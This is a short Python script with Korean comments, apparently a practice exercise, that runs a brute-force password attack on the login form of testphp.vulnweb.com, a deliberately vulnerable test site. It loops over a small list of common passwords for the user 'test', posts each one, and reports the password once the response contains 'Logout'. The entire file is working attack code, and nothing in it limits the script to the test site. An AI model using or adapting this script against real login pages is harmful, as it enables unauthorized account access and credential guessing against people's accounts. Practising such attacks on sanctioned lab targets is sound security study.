import requests
import requests

target_url = "http://testphp.vulnweb.com/userinfo.php" 

# 1. 비밀번호 후보 리스트 (여기에 다 담아둡니다)
passwords = ['1234', 'admin', 'password', 'test', 'guest']

print(f"[{target_url}]에 무차별 대입 공격(Brute Force)을 시작합니다...")

# 2. 반복문 시작 (하나씩 꺼내서 p라고 부르겠다)
for p in passwords:
    
    # 3. [핵심] 페이로드 조립 (여기서 p를 넣어줍니다!)
    # 매번 루프가 돌 때마다 'pass' 부분이 바뀝니다.
    curr_payload = {'uname': 'test', 'pass': p}
    
    print(f"[시도] 패스워드: {p} 로 접속 시도 중...")

    # 4. 요청 전송 (반복문 안에서 계속 쏴야 함)
    res = requests.post(url=target_url, data=curr_payload)

    # 5. 결과 판단
    if "Logout" in res.text:
        print("\n---------------------------------------")
        print(f"[★] 찾았다! 비밀번호는 [{p}] 입니다!") # 성공한 p를 출력
        print("---------------------------------------")
        
        # 중요: 비밀번호를 찾았으면 더 이상 공격할 필요가 없으니 멈춤
        break 
        
    else:
        print(" -> 실패 (X)")

print("공격 종료.")